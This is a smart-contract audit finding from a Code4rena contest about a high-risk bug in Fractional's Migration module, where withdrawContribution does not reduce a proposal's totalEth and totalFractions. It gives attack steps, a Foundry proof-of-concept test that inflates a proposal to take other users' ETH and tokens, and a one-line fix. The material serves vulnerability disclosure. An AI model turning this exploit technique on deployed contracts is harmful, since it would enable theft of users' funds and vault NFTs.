## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Steal NFTs from a Vault, and ETH + Fractional tokens from users.](https://github.com/code-423n4/2022-07-fractional-findings/issues/27) 

# Lines of code

https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L292


# Vulnerability details

## Impact
Steal NFTs from a Vault, and ETH + Fractional tokens from users.

## Description

The `Migration.sol` module expects users to join a proposal using the `join` function, and leave a proposal using the `leave` function, both functions update fraction and ether balances of the proposal *and* the caller.

The `withdrawContribution` function is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.

Unfortunately, the `withdrawContribution` function will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variables `totalEth` and `totalFractions` (as `join` and `leave` do), leading to an inflation of ETH and fractional tokens if the user calls `join`, `withdrawContribution` and `join` again.

Exploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:

1- Lack of funds (they were stolen).

2- Only 1 LIVE proposal can be running at the same time.

A key element to take note is that only 1 proposal can be `LIVE`, but before a proposal goes `LIVE`, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.

## Steps to reproduce
An attacker's will exploit the inflation bug as follow:

1- Wait until there's at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.

2- Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.

3- Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal and `start` it.

Now that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things can be done, including taking over the Vault's NFTs with an evil module once the proposal goes through.

**NOTE: In the `REJECTION_PERIOD` victims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using the `depositAmount` and `msg.value` (https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker. **


## Proof of Concept
The proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproduce PoC that illustrates the impact of the attack.

Everything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.

You can read the PoC or include the function in `test/Migration.t.sol` and call `forge test -vvv --match-test testProposalAttack` to execute it.


```
    function testProposalAttack() public {
        initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);
        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();
        address[] memory modules = new address[](1);
        modules[0] = address(mockModule);

        // STEP 0
        // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made

        // STEP 1
        // Alice makes a legit proposal
        alice.migrationModule.propose(
            vault,
            modules,
            nftReceiverPlugins,
            nftReceiverSelectors,
            TOTAL_SUPPLY * 2,
            1 ether
        );

        // STEP 3
        // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000
        alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);

        // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,
        // but to make this PoC easier to read, instead of creating several fake accounts,
        // let's have just Alice join his own proposal with 50% of token supply.

        // STEP 4
        // Bob makes an evil proposal, with evil modules to steal the vault's NFTs
        bob.migrationModule.propose(
            vault,
            modules,
            nftReceiverPlugins,
            nftReceiverSelectors,
            TOTAL_SUPPLY,
            1 ether
        );

        // STEP 5
        // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal
        // and total locked tokens (thanks to a bug in the `withdrawContribution` function)
        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);
        bob.migrationModule.withdrawContribution(vault, 2);
        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);
        bob.migrationModule.withdrawContribution(vault, 2);
        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);
        bob.migrationModule.withdrawContribution(vault, 2);
        bob.migrationModule.join{value: 10 ether}(vault, 2, 24);
        bob.migrationModule.withdrawContribution(vault, 2);
        bob.migrationModule.join{value: 10 ether}(vault, 2, 101);


        // Let's do some accounting...
        (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);
        (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);

        // Alice proposal has 50 ETH.
        assertEq(totalEth_AliceProposal, 50000000000000000000);

        // Bob's proposal has 50 ETH.
        assertEq(totalEth_BobProposal, 50000000000000000000);

        // He only put 10 ETH, but it shows 50 ETH because
        // we inflate it by exploiting the bug.

        // We can keep inflating it indefinitely to get any ETH
        // amount desired (up to the max ETH balance of the smart contract).

        // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.

        // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.

        // STEP 6
        // Bob calls commit to kickoff the buyout process
        bool started = bob.migrationModule.commit(vault, 2);
        assertTrue(started);

        // Final accounting:
        // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,
        // exactly what is required to win a proposal)
        assertEq(getFractionBalance(buyout), 5101);

        // and 50 ETH from Alice's proposal
        assertEq(getETHBalance(buyout), 50 ether);

        // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether
        assertEq(getETHBalance(bob.addr), 90 ether);

        // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen
        // from Alice's proposal
        assertEq(getFractionBalance(bob.addr), 4899);

        // Next steps are straight forward, you can get creative and do many things that would make the PoC
        // unnecessarily long

        // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE
        // at the same time. Also, there's not enough ETH in the contract to commit his proposal,
        // We are using all of his ETH in our own proposal.

```

## Tools Used
Run `forge test -vvv --match-test testProposalAttack` after preparing the testing environment as explained in https://github.com/code-423n4/2022-07-fractional#prepare-environment


## Recommended Mitigation Steps
Update the `proposal.totalEth` and `proposal.totalFractions` in the `withdrawContribution` function.

